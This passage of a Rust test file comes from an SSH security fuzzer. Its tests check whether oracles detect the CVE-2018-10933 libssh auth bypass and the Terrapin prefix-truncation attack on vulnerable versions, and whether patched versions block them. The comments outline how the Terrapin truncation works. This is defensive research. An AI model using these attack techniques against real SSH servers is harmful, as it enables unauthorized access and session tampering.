            "seed_server_attacker_full_aesgcm",
        ),
        // Publickey login as key A — the baseline for the entity-authentication
        // / impersonation oracle. Mutations that make the server authenticate a
        // different key are flagged as impersonation. The chacha20 variant is
        // libssh-only; the aesgcm variant completes on both libssh and wolfSSH.
        (
            seed_client_attacker_pubkey(server),
            "seed_client_attacker_pubkey",
        ),
        (
            seed_client_attacker_pubkey_aesgcm(server),
            "seed_client_attacker_pubkey_aesgcm",
        ),
        // Session layer: authenticated channel with full connection-protocol
        // traffic (window-adjust / data / extended-data / eof / close).
        (
            seed_client_attacker_channel_data(server),
            "seed_client_attacker_channel_data",
        ),
        // Session layer: authenticated client-initiated rekey (RFC 4253 §9) —
        // drives the server's re-KEX state machine on an established connection.
        (
            seed_client_attacker_rekey(server),
            "seed_client_attacker_rekey",
        ),
        // Two real PUTs relayed by the attacker — the substrate the live
        // matching-conversation oracle needs. Mutations that desync the relayed
        // transcript (Terrapin-style) are flagged as a security objective.
        (
            seed_handshake_two_party(client, server),
            "seed_handshake_two_party",
        ),
    ]
}

#[cfg(test)]
mod tests {
    use puffin::execution::{Runner, TraceRunner};
    use puffin::trace::Spawner;

    use crate::ssh::seeds::{seed_client_attacker_full, seed_server_attacker_full};
    use crate::ssh_registry;

    #[test]
    fn attacker_key_fingerprint_matches_constant() {
        use sha2::{Digest, Sha256};

        use crate::claim::ATTACKER_PUBKEY_SHA256;
        use crate::ssh::fn_impl::fn_client_a_pubkey_blob;
        let blob = fn_client_a_pubkey_blob().unwrap();
        let fp = Sha256::digest(&blob.0);
        assert_eq!(
            fp.as_slice(),
            ATTACKER_PUBKEY_SHA256.as_slice(),
            "ATTACKER_PUBKEY_SHA256 is out of sync with key A's public key"
        );
    }

    /// End-to-end: the honest publickey login as A completes against the real
    /// libssh server, and the entity-authentication oracle is clean (A is the
    /// key the attacker legitimately controls — no impersonation).
    #[test_log::test]
    fn test_seed_client_attacker_pubkey() {
        use puffin::algebra::dynamic_function::TypeShape;

        use crate::claim::{SshClaimInner, ATTACKER_PUBKEY_SHA256};
        use crate::ssh::seeds::seed_client_attacker_pubkey;

        let registry = ssh_registry();
        let runner = Runner::new(registry.clone(), Spawner::new(registry));
        let server = puffin::agent::AgentName::first();
        let context = runner
            .execute(seed_client_attacker_pubkey(server), &mut 0)
            .unwrap();

        assert!(
            context.find_agent(server).unwrap().is_state_successful(),
            "server did not reach DONE via publickey auth"
        );

        let claim = context
            .find_claim(server, TypeShape::of::<SshClaimInner>())
            .expect("server emitted no claim");
        let inner = claim.as_any().downcast_ref::<Box<SshClaimInner>>().unwrap();
        assert_eq!(inner.auth_method, "publickey", "expected publickey auth");
        assert_eq!(
            inner.auth_key_fingerprint.as_slice(),
            ATTACKER_PUBKEY_SHA256.as_slice(),
            "server authenticated a key other than A"
        );
    }

    /// CVE-2018-10933 positive demonstration: the auth-bypass seed must trip the
    /// entity-authentication oracle on vulnerable libssh 0.8.3, and must NOT on
    /// the patched 0.10.4 / 0.11.4 — the property (not a coded mechanism)
    /// distinguishes them.
    #[test_log::test]
    fn test_cve_2018_10933_auth_bypass_differential() {
        use puffin::put::{PutDescriptor, PutOptions};

        use crate::ssh::seeds::seed_client_attacker_auth_bypass;

        let registry = ssh_registry();
        let server = puffin::agent::AgentName::first();
        let puts: Vec<String> = registry.puts().map(|(n, _)| n.to_owned()).collect();

        let mut saw_vulnerable = false;
        for put in puts {
            if !put.starts_with("libssh") {
                continue;
            }
            let spawner = Spawner::new(registry.clone()).with_mapping(&[(
                server,
                PutDescriptor::new(put.clone(), PutOptions::default()),
            )]);
            let runner = Runner::new(registry.clone(), spawner);
            let result = runner.execute(seed_client_attacker_auth_bypass(server), &mut 0);
            let fired =
                matches!(&result, Err(e) if format!("{e}").contains("authentication bypass"));

            if put.contains("0803") {
                assert!(
                    fired,
                    "{put} (vulnerable) should trip the auth-bypass oracle"
                );
                saw_vulnerable = true;
            } else {
                assert!(!fired, "{put} (patched) must NOT report an auth bypass");
            }
        }
        assert!(
            saw_vulnerable,
            "vulnerable libssh0803 PUT not present — build it first"
        );
    }

    /// Trace-analysis matching conversation: recover, by re-evaluating the
    /// trace's input recipes, what each honest party received on the wire — and
    /// show that dropping a relayed message (the Terrapin truncation primitive)
    /// changes the delivered transcript. No PUT introspection, mechanism-blind.
    #[test_log::test]
    fn test_delivered_transcript_detects_dropped_message() {
        use puffin::trace::Action;

        use crate::ssh::seeds::seed_handshake_two_party;
        use crate::violation::delivered_to;

        let registry = ssh_registry();
        let client = puffin::agent::AgentName::first();
        let server = client.next();

        // Honest relay: recover both parties' received transcripts.
        let honest = seed_handshake_two_party(client, server);
        let runner = Runner::new(registry.clone(), Spawner::new(registry.clone()));
        let ctx = runner.execute(honest.clone(), &mut 0).unwrap();
        let server_rx_honest = delivered_to(&honest, &ctx, server);
        let client_rx_honest = delivered_to(&honest, &ctx, client);
        assert!(
            !server_rx_honest.is_empty(),
            "no transcript delivered to server"
        );
        assert!(
            !client_rx_honest.is_empty(),
            "no transcript delivered to client"
        );

        // Tampered relay: the attacker drops the last c2s forward. The delivered
        // transcript to the server must shrink — the manipulation is visible
        // purely from the trace.
        let mut tampered = honest.clone();
        let drop_idx = tampered
            .steps
            .iter()
            .rposition(|s| s.agent == server && matches!(s.action, Action::Input(_)))
            .expect("no server input step to drop");
        tampered.steps.remove(drop_idx);

        // Evaluate the tampered trace's deliveries against the (honest) context;
        // the dropped forward simply isn't delivered, so the transcript shrinks.
        let server_rx_tampered = delivered_to(&tampered, &ctx, server);
        assert!(
            server_rx_tampered.len() < server_rx_honest.len(),
            "dropping a relayed message should shrink the server's received transcript \
             (honest {} vs tampered {})",
            server_rx_honest.len(),
            server_rx_tampered.len()
        );
    }

    /// Terrapin precondition differential, by construction: the injected
    /// cleartext `IGNORE` during KEX is **rejected by strict-kex (libssh 0.11.4)**
    /// and **accepted by non-strict (libssh 0.10.4)**. This is exactly the
    /// enabling condition for a Terrapin prefix truncation — present on the
    /// vulnerable version, mitigated on the patched one. (A fully tag-preserving
    /// truncation that completes and trips the matching-conversation oracle needs
    /// exact sequence-number realignment — separate, deeper work.)
    #[test_log::test]
    fn test_terrapin_ignore_rejected_under_strict_kex() {
        use puffin::put::{PutDescriptor, PutOptions};

        use crate::ssh::seeds::seed_terrapin_attempt;

        let registry = ssh_registry();
        let client = puffin::agent::AgentName::first();
        let server = client.next();

        let run = |put: &str| -> String {
            let spawner = Spawner::new(registry.clone()).with_mapping(&[
                (client, PutDescriptor::new(put, PutOptions::default())),
                (server, PutDescriptor::new(put, PutOptions::default())),
            ]);
            match Runner::new(registry.clone(), spawner)
                .execute(seed_terrapin_attempt(client, server), &mut 0)
            {
                Ok(_) => String::new(),
                Err(e) => format!("{e}"),
            }
        };

        if registry.find_by_id("libssh0114-asan").is_some() {
            let e = run("libssh0114-asan");
            assert!(
                e.to_lowercase().contains("strict kex"),
                "0.11.4 should reject the injected IGNORE under strict kex; got: {e:?}"
            );
        }
        if registry.find_by_id("libssh0104-asan").is_some() {
            let e = run("libssh0104-asan");
            assert!(
                !e.to_lowercase().contains("strict kex"),
                "0.10.4 (no strict kex) must NOT reject the IGNORE as a strict-kex \
                 violation; got: {e:?}"
            );
        }
    }

    /// FLAGSHIP: the DY fuzzer detects the Terrapin prefix-truncation attack
    /// (CVE-2023-48795) via the *generic* matching-conversation property — not a
    /// Terrapin-specific signature. On vulnerable libssh 0.10.4 the s2c truncation
    /// (drop the server's ignorable EXT_INFO with a compensating IGNORE-injected
    /// seqno shift) completes with valid AEAD tags, yet the server's sent
    /// transcript and the client's received transcript disagree → the security
    /// oracle raises Error::SecurityClaim (a fuzzer objective). On patched 0.11.4,
    /// strict-kex rejects the injected IGNORE during KEX, so the attack never
    /// completes — the mitigation is confirmed.
    #[test_log::test]
    fn test_terrapin_s2c_detected_and_mitigated() {
        use puffin::error::Error;
        use puffin::put::{PutDescriptor, PutOptions};

        use crate::ssh::seeds::seed_terrapin_s2c;

        let registry = ssh_registry();
        let client = puffin::agent::AgentName::first();
        let server = client.next();
        let run = |put: &str| {
            let spawner = Spawner::new(registry.clone()).with_mapping(&[
                (client, PutDescriptor::new(put, PutOptions::default())),
                (server, PutDescriptor::new(put, PutOptions::default())),
            ]);
            Runner::new(registry.clone(), spawner)
                .execute(seed_terrapin_s2c(client, server), &mut 0)
        };

        // Vulnerable: matching-conversation violation is detected (security objective).
        if registry.find_by_id("libssh0104-asan").is_some() {
            match run("libssh0104-asan") {
                Err(Error::SecurityClaim(msg)) => assert!(
                    msg.to_lowercase().contains("matching-conversation")
                        || msg.to_lowercase().contains("transcript"),
                    "unexpected security-claim message: {msg}"
                ),
                other => panic!(
                    "0.10.4: expected a matching-conversation SecurityClaim (Terrapin detected); got {other:?}"
                ),
            }
        }
        // Patched: strict-kex rejects the injected IGNORE; attack does not complete.
        if registry.find_by_id("libssh0114-asan").is_some() {
            match run("libssh0114-asan") {
                Err(e) => assert!(
                    format!("{e}").to_lowercase().contains("strict kex"),
                    "0.11.4: expected strict-kex mitigation; got {e}"
                ),
                Ok(_) => panic!("0.11.4: Terrapin unexpectedly completed (mitigation failed!)"),
            }
        }
    }

    /// Documents the empirical Terrapin blocker (see `seed_terrapin_packet`): in
    /// the c2s direction the client emits a single post-NewKeys packet, so the
    /// tag-preserving truncation can't realign and does not complete on 0.10.4;
    /// strict-kex (0.11.4) rejects the injected IGNORE outright. Regression guard
    /// for the WIP — a future s2c/EXT_INFO truncation should make 0.10.4 complete
    /// with a matching-conversation violation, flipping this expectation.
    #[test_log::test]
    fn test_terrapin_packet_c2s_blocked() {
        use puffin::put::{PutDescriptor, PutOptions};

        use crate::ssh::seeds::seed_terrapin_packet;

        let registry = ssh_registry();
        let client = puffin::agent::AgentName::first();
        let server = client.next();
        let run = |put: &str| -> Option<String> {
            registry.find_by_id(put)?;
            let spawner = Spawner::new(registry.clone()).with_mapping(&[
                (client, PutDescriptor::new(put, PutOptions::default())),
                (server, PutDescriptor::new(put, PutOptions::default())),
            ]);
            Some(
                match Runner::new(registry.clone(), spawner)
                    .execute(seed_terrapin_packet(client, server), &mut 0)
                {
                    Ok(_) => String::new(),
                    Err(e) => format!("{e}"),
                },
            )
        };
        if let Some(e) = run("libssh0114-asan") {
            assert!(
                e.to_lowercase().contains("strict kex"),
                "0.11.4 should reject the injected IGNORE under strict kex; got {e:?}"
            );
        }
        if let Some(e) = run("libssh0104-asan") {
            // c2s truncation can't realign yet (single post-NewKeys client packet):
            // the trace does not complete cleanly. It must NOT be a strict-kex abort.
            assert!(
                !e.is_empty() && !e.to_lowercase().contains("strict kex"),
                "0.10.4 c2s terrapin packet: expected a non-strict-kex incompletion; got {e:?}"
            );
        }
    }

    /// Packet-granular relay (WIP): the cleartext handshake + first encrypted
    /// exchange relay one packet at a time (proving individual encrypted packets
    /// are forwardable), but the handshake doesn't yet complete due to libssh I/O
    /// batching — see the function doc. Asserted as "reaches the encrypted phase"
    /// so this stays a regression guard for the packet-granular capability.
    #[test_log::test]
    fn test_packet_relay_reaches_encrypted_phase() {
        use crate::ssh::seeds::seed_handshake_two_party_packet;

        let registry = ssh_registry();
        let client = puffin::agent::AgentName::first();
        let server = client.next();
        // It currently errors when it runs out of one-packet-at-a-time auth
        // messages; that it gets that far means cleartext + first encrypted
        // exchange relayed individually (the packet-granular capability works).
        let res = Runner::new(registry.clone(), Spawner::new(registry.clone()))
            .execute(seed_handshake_two_party_packet(client, server), &mut 0);
        // Either it completes (future work) or fails reaching a later encrypted
        // packet — never earlier than the first encrypted exchange.
        if let Err(e) = res {
            let msg = format!("{e}");
            assert!(
                msg.contains("OnWireData"),
                "packet relay broke before the encrypted phase: {msg}"
            );
        }
    }

    /// Regression guard for the differential determinism fix: a same-vs-same
    /// differential (identical PUT on both sides) over the AES-GCM seed must
    /// report NO differences — including the encrypted/decryption layer. Before
    /// reseeding the RNG before *each* PUT, the second PUT drew different KEX
    /// randomness and produced spurious decryption-layer diffs.
    ///
    /// `#[ignore]`: this asserts cross-run determinism, which is defeated by the
    /// *process-global* OpenSSL RNG being consumed concurrently by other tests
    /// under cargo's parallel runner. The production differential is
    /// process-isolated (one PUT pair per worker), so it is unaffected. Run with
    /// `cargo test -- --ignored --test-threads=1`.
    #[ignore = "shares the process-global OpenSSL RNG; run with --test-threads=1"]
    #[test_log::test]
    fn test_differential_same_vs_same_is_clean() {
        use puffin::execution::{DifferentialRunner, TraceRunner};
        use puffin::put::{PutDescriptor, PutOptions};
        use puffin::trace::ConfigTrace;

        use crate::ssh::seeds::seed_client_attacker_full_aesgcm;

        let registry = ssh_registry();
        let server = puffin::agent::AgentName::first();
        let put = |n: &str| PutDescriptor::new(n, PutOptions::default());
        // Both vendors' KEX RNGs are made deterministic by rng_reseed: libssh
        // routes ssh_get_random -> our RAND_METHOD; wolfSSH routes wolfCrypt's
        // wc_GenerateSeed -> puffin_wolfssl_seed (the vendor is built with
        // -DCUSTOM_RAND_GENERATE_SEED). So same-vs-same must be clean for both,
        // including the decryption layer.
        for name in ["libssh0114-asan", "libssh0104-asan", "wolfssh-asan"] {
            if registry.find_by_id(name).is_none() {
                continue;
            }
            let s1 = Spawner::new(registry.clone()).with_mapping(&[(server, put(name))]);
            let s2 = Spawner::new(registry.clone()).with_mapping(&[(server, put(name))]);
            let runner = DifferentialRunner::new(registry.clone(), s1, s2);
            let res = (&runner).execute_config(
                seed_client_attacker_full_aesgcm(server),
                ConfigTrace::default(),
                &mut 0,
            );
            assert!(
                res.is_ok(),
                "{name} same-vs-same differential must be clean; got {:?}",
                res.err()
            );
        }
    }

    /// The *cross-vendor* differential (libssh vs wolfSSH) must report ZERO
    /// differences on every seed. If seeds diverged, a fuzzing campaign would
    /// inherit that divergence on every mutant and bury real findings under
    /// systematic, benign noise. Zero-on-seeds is achieved by the security-state
    /// comparison policy in `differential_fuzzing_filter_diff` (claims +
    /// security-violations + status; transport transcripts excluded) plus
    /// claim-name canonicalization and the `#[comparable_ignore]` on the claim
    /// step — *not* by loosening the oracle: a real downgrade, impersonation,
    /// auth-bypass, null cipher, or matching-conversation break still surfaces as
    /// a claim / security-violation / status diff.
    ///
    /// `#[ignore]`: see `test_differential_same_vs_same_is_clean` — relies on the
    /// process-global OpenSSL RNG (libssh side), so run serially:
    /// `cargo test -- --ignored --test-threads=1`.
    #[ignore = "shares the process-global OpenSSL RNG; run with --test-threads=1"]
    #[test_log::test]
    fn test_xvendor_seeds_zero_difference() {
        use puffin::execution::{DifferentialRunner, TraceRunner};
        use puffin::put::{PutDescriptor, PutOptions};
        use puffin::trace::{ConfigTrace, Trace};

        use crate::protocol::SshProtocolTypes;
        use crate::ssh::seeds::{
            seed_client_attacker_full_aesgcm, seed_client_attacker_pubkey_aesgcm,
        };

        let registry = ssh_registry();
        let server = puffin::agent::AgentName::first();
        let put = |n: &str| PutDescriptor::new(n, PutOptions::default());
        if registry.find_by_id("libssh0114-asan").is_none()
            || registry.find_by_id("wolfssh-asan").is_none()
        {
            return; // need both vendors for a cross-vendor comparison
        }

        let seeds: [(
            &str,
            fn(puffin::agent::AgentName) -> Trace<SshProtocolTypes>,
        ); 3] = [
            ("attacker_full_aesgcm", seed_client_attacker_full_aesgcm),
            ("pubkey_aesgcm", seed_client_attacker_pubkey_aesgcm),
            (
                "kexinit_synth",
                crate::ssh::seeds::seed_client_attacker_full_kexinit_synth,
            ),
        ];
        for (label, seed) in seeds {
            let s1 =
                Spawner::new(registry.clone()).with_mapping(&[(server, put("libssh0114-asan"))]);
            let s2 = Spawner::new(registry.clone()).with_mapping(&[(server, put("wolfssh-asan"))]);
            let runner = DifferentialRunner::new(registry.clone(), s1, s2);
            let res = (&runner).execute_config(seed(server), ConfigTrace::default(), &mut 0);
            assert!(
                res.is_ok(),
                "cross-vendor seed [{label}] (libssh0114 vs wolfSSH) must have 0 differences; got {:?}",
                res.err()
            );
        }
    }

    /// The live matching-conversation oracle: a faithful relay agrees (no
    /// violation), but dropping a *mid-stream* relayed message (the Terrapin
    /// truncation primitive) breaks the transcript prefix relation and is
    /// flagged. Exercises `matching_conversation_violation` — the function the
    /// trace-aware security hook runs.
    #[test_log::test]
    fn test_matching_conversation_oracle() {
        use puffin::trace::Action;

        use crate::ssh::seeds::seed_handshake_two_party;
        use crate::violation::matching_conversation_violation;

        let registry = ssh_registry();
        let client = puffin::agent::AgentName::first();
        let server = client.next();
        let honest = seed_handshake_two_party(client, server);
        let runner = Runner::new(registry.clone(), Spawner::new(registry));
        let ctx = runner.execute(honest.clone(), &mut 0).unwrap();

        // Faithful relay: the two views agree.
        assert_eq!(matching_conversation_violation(&honest, &ctx), None);

        // Drop a MID-STREAM client->server forward (not the in-flight tail): the
        // server's received transcript diverges from what the client sent.
        let server_inputs: Vec<usize> = honest
            .steps
            .iter()
            .enumerate()
            .filter(|(_, s)| s.agent == server && matches!(s.action, Action::Input(_)))
            .map(|(i, _)| i)
            .collect();
        let mut tampered = honest.clone();
        tampered
            .steps
            .remove(server_inputs[server_inputs.len() / 2]);

        assert!(
            matching_conversation_violation(&tampered, &ctx).is_some(),
            "dropping a mid-stream relayed message must trip the matching-conversation oracle"
        );
    }

    /// Cross-vendor: the AES-GCM publickey login as A completes against BOTH
    /// libssh and wolfSSH, the server records A's fingerprint, and the
    /// entity-authentication oracle is clean on both (no impersonation).
    #[test_log::test]
    fn test_seed_client_attacker_pubkey_aesgcm_both_puts() {
        use puffin::algebra::dynamic_function::TypeShape;
        use puffin::put::{PutDescriptor, PutOptions};

        use crate::claim::{SshClaimInner, ATTACKER_PUBKEY_SHA256};
        use crate::ssh::seeds::seed_client_attacker_pubkey_aesgcm;

        let registry = ssh_registry();
        let server = puffin::agent::AgentName::first();

        // Run on every PUT that completes the AES-GCM handshake (modern libssh +
        // wolfSSH). libssh 0.8.x predates aes256-gcm@openssh.com, so skip it.
        let puts: Vec<String> = registry.puts().map(|(n, _)| n.to_owned()).collect();
        for put in puts {
            if put.contains("0803") {
                continue;
            }
            let spawner = Spawner::new(registry.clone()).with_mapping(&[(
                server,
                PutDescriptor::new(put.clone(), PutOptions::default()),
            )]);
            let runner = Runner::new(registry.clone(), spawner);
            let context = runner
                .execute(seed_client_attacker_pubkey_aesgcm(server), &mut 0)
                .unwrap_or_else(|e| panic!("pubkey-aesgcm failed on {put}: {e}"));

            assert!(
                context.find_agent(server).unwrap().is_state_successful(),
                "{put}: server did not reach DONE via publickey auth"
            );
            let claim = context
                .find_claim(server, TypeShape::of::<SshClaimInner>())
                .unwrap_or_else(|| panic!("{put}: no claim"));
            let inner = claim.as_any().downcast_ref::<Box<SshClaimInner>>().unwrap();
            assert_eq!(
                inner.auth_method, "publickey",
                "{put}: expected publickey auth"
            );
            assert_eq!(
                inner.auth_key_fingerprint.as_slice(),
                ATTACKER_PUBKEY_SHA256.as_slice(),
                "{put}: server authenticated a key other than A"
            );
        }
    }

    /// The synthesized-KEXINIT seed (algorithm lists built from atoms via the new
    /// `fn_kex_init` + `fn_*_algos` + `fn_namelist_*` builders) must negotiate the
    /// same AES-256-GCM suite and complete the handshake on both vendors — proving
    /// the negotiation-builder path is valid end-to-end and gives the fuzzer a
    /// KEXINIT whose offered algorithms are mutable sub-terms.
    /// The rekey seed must execute without a PUT error on libssh — i.e. the server
    /// accepts and processes the encrypted second KEXINIT / ECDH_INIT / NEWKEYS
    /// (a successful AES-GCM decrypt + a completed re-KEX). A decrypt/tag failure
    /// or a rejected rekey would surface as Err. Proves the rekey handshake is
    /// wire-correct and reaches libssh's re-KEX state machine.
    #[test_log::test]
    fn test_seed_rekey_accepted() {
        use puffin::put::{PutDescriptor, PutOptions};

        use crate::ssh::seeds::seed_client_attacker_rekey;

        let registry = ssh_registry();
        let server = puffin::agent::AgentName::first();
        if registry.find_by_id("libssh0114-asan").is_none() {
            return;
        }
        let spawner = Spawner::new(registry.clone()).with_mapping(&[(
            server,
            PutDescriptor::new("libssh0114-asan", PutOptions::default()),
        )]);
        let res = Runner::new(registry.clone(), spawner)
            .execute(seed_client_attacker_rekey(server), &mut 0);
        assert!(
            res.is_ok(),
            "rekey seed must be accepted by libssh (re-KEX completes); got {:?}",
            res.err()
        );
    }

    /// The session-layer seed must authenticate (publickey, key A), open a channel,
    /// and have the server process the full connection-protocol message set
    /// (window-adjust / data / extended-data / eof / close) without error on
    /// libssh — proving the new channel traffic is wire-correct and reaches the
    /// connection-protocol handlers (a code area no other seed exercises).
    #[test_log::test]
    fn test_seed_channel_data_completes() {
        use puffin::algebra::dynamic_function::TypeShape;
        use puffin::put::{PutDescriptor, PutOptions};

        use crate::claim::{SshClaimInner, ATTACKER_PUBKEY_SHA256};
        use crate::ssh::seeds::seed_client_attacker_channel_data;

        let registry = ssh_registry();
        let server = puffin::agent::AgentName::first();
        if registry.find_by_id("libssh0114-asan").is_none() {
            return;
        }
        let spawner = Spawner::new(registry.clone()).with_mapping(&[(
            server,
            PutDescriptor::new("libssh0114-asan", PutOptions::default()),
        )]);
        let runner = Runner::new(registry.clone(), spawner);
        let ctx = runner
            .execute(seed_client_attacker_channel_data(server), &mut 0)
            .expect("channel-data seed must execute without PUT error on libssh");
        let claim = ctx
            .find_claim(server, TypeShape::of::<SshClaimInner>())
            .expect("channel-data seed emitted no claim (auth did not complete)");
        let inner = claim.as_any().downcast_ref::<Box<SshClaimInner>>().unwrap();
        assert_eq!(inner.auth_method, "publickey");
        assert_eq!(
            inner.auth_key_fingerprint.as_slice(),
            ATTACKER_PUBKEY_SHA256.as_slice(),
            "server authenticated a key other than A"
        );
    }

    /// The non-AEAD aes256-ctr + hmac-sha2-256 seed must complete the handshake on
    /// **libssh** — proving the new AES-CTR + HMAC packet crypto is wire-correct
    /// and that the alternative suite is reachable end-to-end (the coverage lever:
    /// it exercises the separate-cipher + separate-MAC path, not the AEAD path).
    /// wolfSSH (as built here) only negotiates AES-GCM, so aes256-ctr is
    /// libssh-only, exactly like the existing chacha20 seeds.
    #[test_log::test]
    fn test_seed_ctr_suite_completes() {
        use puffin::algebra::dynamic_function::TypeShape;
        use puffin::put::{PutDescriptor, PutOptions};

        use crate::claim::SshClaimInner;
        use crate::ssh::seeds::seed_client_attacker_full_ctr;

        let registry = ssh_registry();
        let server = puffin::agent::AgentName::first();

        // libssh: must complete on the CTR suite and emit the canonical claim.
        if registry.find_by_id("libssh0114-asan").is_some() {
            let spawner = Spawner::new(registry.clone()).with_mapping(&[(
                server,
                PutDescriptor::new("libssh0114-asan", PutOptions::default()),
            )]);
            let runner = Runner::new(registry.clone(), spawner);
            let ctx = runner
                .execute(seed_client_attacker_full_ctr(server), &mut 0)
                .expect("ctr seed must complete on libssh");
            let claim = ctx
                .find_claim(server, TypeShape::of::<SshClaimInner>())
                .expect("libssh: ctr seed emitted no claim");
            let inner = claim.as_any().downcast_ref::<Box<SshClaimInner>>().unwrap();
            assert_eq!(inner.cipher_in, "aes256-ctr", "got {:?}", inner.cipher_in);
            assert_eq!(inner.hmac_in, "hmac-sha2-256", "got {:?}", inner.hmac_in);
            assert_eq!(inner.auth_method, "password");
        }

        // wolfSSH: aes256-ctr is not in its negotiated set, so the handshake fails
        // at algorithm matching. That's expected — just assert it does NOT complete
        // with a CTR claim (it should error, not silently negotiate something else).
        if registry.find_by_id("wolfssh-asan").is_some() {
            let spawner = Spawner::new(registry.clone()).with_mapping(&[(
                server,
                PutDescriptor::new("wolfssh-asan", PutOptions::default()),
            )]);
            let runner = Runner::new(registry.clone(), spawner);
            let res = runner.execute(seed_client_attacker_full_ctr(server), &mut 0);
            assert!(
                res.is_err(),
                "wolfSSH unexpectedly accepted aes256-ctr (build gained CTR support?)"
            );
        }
    }

    #[test_log::test]
    fn test_seed_kexinit_synth_completes() {
        use puffin::algebra::dynamic_function::TypeShape;
        use puffin::put::{PutDescriptor, PutOptions};

        use crate::claim::SshClaimInner;
        use crate::ssh::seeds::seed_client_attacker_full_kexinit_synth;

        let registry = ssh_registry();
        let server = puffin::agent::AgentName::first();
        for put in ["libssh0114-asan", "wolfssh-asan"] {
            if registry.find_by_id(put).is_none() {
                continue;
            }
            let spawner = Spawner::new(registry.clone())
                .with_mapping(&[(server, PutDescriptor::new(put, PutOptions::default()))]);
            let runner = Runner::new(registry.clone(), spawner);
            let ctx = runner
                .execute(seed_client_attacker_full_kexinit_synth(server), &mut 0)
                .unwrap_or_else(|e| panic!("synth-kexinit seed failed on {put}: {e}"));
            let claim = ctx
                .find_claim(server, TypeShape::of::<SshClaimInner>())
                .unwrap_or_else(|| panic!("{put}: synth-kexinit seed emitted no claim"));
            let inner = claim.as_any().downcast_ref::<Box<SshClaimInner>>().unwrap();
            assert_eq!(
                inner.kex, "curve25519-sha256",
                "{put}: synth KEXINIT negotiated unexpected kex {:?}",
                inner.kex
            );
            assert_eq!(
                inner.cipher_in, "aes256-gcm@openssh.com",
                "{put}: synth KEXINIT negotiated unexpected cipher {:?}",
                inner.cipher_in
            );
        }
    }

    #[test_log::test]
    fn test_seed_client_attacker_full() {
        let registry = ssh_registry();
        let runner = Runner::new(registry.clone(), Spawner::new(registry));
        let server = puffin::agent::AgentName::first();
        let trace = seed_client_attacker_full(server);
        let result = runner.execute(trace, &mut 0);
        // The trace must execute without hard errors
        let context = result.unwrap();
        // The server should have processed auth and be in DONE state
        assert!(
            context.find_agent(server).unwrap().is_state_successful(),
            "server did not reach DONE state"
        );
    }

    #[test_log::test]
    fn test_seed_server_attacker_full() {
        let registry = ssh_registry();
        let runner = Runner::new(registry.clone(), Spawner::new(registry));
        let client = puffin::agent::AgentName::first();
        let trace = seed_server_attacker_full(client);
        let context = runner.execute(trace, &mut 0).unwrap();
        // The client should have completed authentication
        assert!(
            context.find_agent(client).unwrap().is_state_successful(),
            "client did not reach DONE state"
        );
    }

    /// End-to-end check that the libssh harness emits a HandshakeComplete claim
    /// once the transport handshake finishes, and that it travels through the
    /// notify trampoline into the global claim list with sane negotiated values.
    #[test_log::test]
    fn test_handshake_claim_emitted() {
        use puffin::algebra::dynamic_function::TypeShape;

        use crate::claim::SshClaimInner;

        let registry = ssh_registry();
        let runner = Runner::new(registry.clone(), Spawner::new(registry));
        let server = puffin::agent::AgentName::first();
        let trace = seed_client_attacker_full(server);
        let context = runner.execute(trace, &mut 0).unwrap();

        let claim = context
            .find_claim(server, TypeShape::of::<SshClaimInner>())
            .expect("server emitted no HandshakeComplete claim");

        // `Claim::inner` boxes a `Box<SshClaimInner>`, so that is the concrete
        // type behind the trait object.
        let inner = claim
            .as_any()
            .downcast_ref::<Box<SshClaimInner>>()
            .expect("claim inner was not an SshClaimInner");

        assert!(inner.is_server, "server claim should have is_server = true");
        assert!(
            inner.kex.contains("curve25519"),
            "unexpected negotiated kex: {:?}",
            inner.kex
        );
        assert!(
            !inner.cipher_in.is_empty() && !inner.cipher_out.is_empty(),
            "negotiated ciphers should be populated: in={:?} out={:?}",
            inner.cipher_in,
            inner.cipher_out
        );
    }

    /// Diagnostic: drive two real libssh PUTs through a handshake purely by DY
    /// relay, and report how far each gets. This validates the two-honest-party
    /// trace shape needed for the matching-conversation property.
    #[test_log::test]
    fn test_handshake_two_party() {
        use puffin::algebra::dynamic_function::TypeShape;

        use crate::claim::SshClaimInner;
        use crate::ssh::seeds::seed_handshake_two_party;

        let registry = ssh_registry();
        let runner = Runner::new(registry.clone(), Spawner::new(registry));
        let client = puffin::agent::AgentName::first();
        let server = client.next();
        let trace = seed_handshake_two_party(client, server);

        let context = runner.execute(trace, &mut 0).unwrap();

        // Both honest endpoints must complete the handshake by pure relay.
        assert!(
            context.find_agent(client).unwrap().is_state_successful(),
            "client did not reach DONE"
        );
        assert!(
            context.find_agent(server).unwrap().is_state_successful(),
            "server did not reach DONE"
        );

        // Both endpoints must emit a HandshakeComplete claim — the two honest
        // views the matching-conversation oracle compares.
        assert!(
            context
                .find_claim(client, TypeShape::of::<SshClaimInner>())
                .is_some(),
            "client emitted no claim"
        );
        assert!(
            context
                .find_claim(server, TypeShape::of::<SshClaimInner>())
                .is_some(),
            "server emitted no claim"
        );

        // On the benign relay the two views must agree: the matching-conversation
        // oracle reports no violation.
        assert!(
            context.verify_security_violations().is_ok(),
            "matching-conversation oracle fired on a benign honest relay (false positive)"
        );
    }

    /// Claim-name alignment: under the same AES-GCM handshake, libssh and wolfSSH
    /// report the negotiated algorithms with completely different spellings
    /// (libssh wire names vs wolfSSH human descriptions). After
    /// `SshClaimInner::canonicalize` they must collapse to identical SSH wire
    /// tokens, so the differential's claim comparison sees benign naming as equal
    /// and only flags a genuine negotiation divergence. Guards the normalization
    /// that lets `differential_fuzzing_filter_diff` keep (not drop) claim diffs.
    #[test_log::test]
    fn test_claim_names_canonical_across_vendors() {
        use puffin::algebra::dynamic_function::TypeShape;

        use crate::claim::SshClaimInner;
        use crate::ssh::seeds::seed_client_attacker_full_aesgcm;

        let registry = ssh_registry();
        let server = puffin::agent::AgentName::first();

        let field_tuple = |name: &str| -> Option<(String, String, String, String, String)> {
            registry.find_by_id(name)?;
            let put = puffin::put::PutDescriptor::new(name, puffin::put::PutOptions::default());
            let r = Runner::new(
                registry.clone(),
                Spawner::new(registry.clone()).with_mapping(&[(server, put)]),
            );
            let ctx = r
                .execute(seed_client_attacker_full_aesgcm(server), &mut 0)
                .ok()?;
            let c = ctx.find_claim(server, TypeShape::of::<SshClaimInner>())?;
            let i = c.as_any().downcast_ref::<Box<SshClaimInner>>().unwrap();
            Some((
                i.kex.clone(),
                i.cipher_in.clone(),
                i.cipher_out.clone(),
                i.hmac_in.clone(),
                i.hmac_out.clone(),
            ))
        };

        let lib = field_tuple("libssh0114-asan");
        let wolf = field_tuple("wolfssh-asan");

        // Both vendors must be available for this cross-vendor assertion to mean
        // anything; if either is missing, there is nothing to compare.
